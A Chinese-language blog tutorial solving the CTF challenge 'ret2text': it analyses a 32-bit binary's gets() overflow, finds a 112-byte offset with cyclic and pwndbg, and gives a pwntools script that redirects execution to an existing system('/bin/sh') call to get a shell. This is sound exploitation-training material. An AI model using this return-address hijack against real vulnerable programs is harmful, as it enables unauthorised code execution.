---
layout: post
title: CTF-PWN实例1（ret2text）
categories: 
 - CTF
 - PWN
 - 二进制
permalink: /pwn/1
nocomments: true  # Disable the comment box. This is EasyBook feature
typora-root-url: ..\_site
---

# CTF-PWN实例1（ret2text）

## 题目地址：

https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2text

## 程序保护：

```shell
$ checksec ret2text
```

```shell
	Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

这里和上一题唯一的区别在于开启了NX保护，因此我们不能在堆栈中写入shellcode。

## 解题：

### 一、IDA分析程序溢出点

IDA分析main函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("There is something amazing here, do you know anything?");
  gets((char *)&v4);
  printf("Maybe I will tell you next time !");
  return 0;
}
```

这里依旧是gets()函数造成溢出。

### 二、cyclic和pwndbg判断偏移量

```shell
$ cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
$ gdb ret2text
........
pwndbg> r
Starting program: /home/dtuncle/ctf-challenges/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text 
There is something amazing here, do you know anything?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
Maybe I will tell you next time !
Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────[ REGISTERS ]────────────────────────────────────
 EAX  0x0
 EBX  0x0
 ECX  0xffffffff
 EDX  0xf7fb6870 (_IO_stdfile_1_lock) ◂— 0
 EDI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 ESI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 EBP  0x62616163 ('caab')
 ESP  0xffffcfa0 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
 EIP  0x62616164 ('daab')
─────────────────────────────────────[ DISASM ]──────────────────────────────────────
Invalid address 0x62616164

──────────────────────────────────────[ STACK ]──────────────────────────────────────
00:0000│ esp  0xffffcfa0 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
01:0004│      0xffffcfa4 ◂— 'faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
02:0008│      0xffffcfa8 ◂— 'gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
03:000c│      0xffffcfac ◂— 'haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
04:0010│      0xffffcfb0 ◂— 'iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
05:0014│      0xffffcfb4 ◂— 'jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
06:0018│      0xffffcfb8 ◂— 'kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
07:001c│      0xffffcfbc ◂— 'laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
────────────────────────────────────[ BACKTRACE ]────────────────────────────────────
 ► f 0 62616164
   f 1 62616165
   f 2 62616166
   f 3 62616167
   f 4 62616168
   f 5 62616169
   f 6 6261616a
   f 7 6261616b
   f 8 6261616c
   f 9 6261616d
   f 10 6261616e
Program received signal SIGSEGV (fault address 0x62616164)
pwndbg> quit
$ cyclic -l 0x62616164
112
```

偏移量依然是112，这些例子主要是为了区分各种不同的保护机制，所以重点都不在于找出溢出的偏移，而是对应的保护机制如何利用获取到shell。

### 三、编写EXP

思路：

在这里明显不能直接在.bss写入shellcode，所以我们先在程序内查找是否能找到system函数，是否可以直接利用。

![](/img/post1img/dingweiSYS.jpg)

在0x0804863a这个地址将“/bin/sh”作为参数压入栈，并且下一步调用了_system函数，这就是最原始的shellcode。所以这一题很简单，只需要将返回地址覆盖成0x0804863A这个地址就行了。

exp代码：

```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *

p = process('./ret2text')

p.sendline('a'*112+p32(0x0804863A))   #p32()是将数字转换成字符串，这样写入到栈中会成为地址

p.interactive()

```

## 总结

这一题本来存在NX保护，但是由于程序本身存在system函数而且可以直接利用所以此题会显得特别简单。但是当没有可利用的system函数时将会是另外的利用方法，之后会介绍。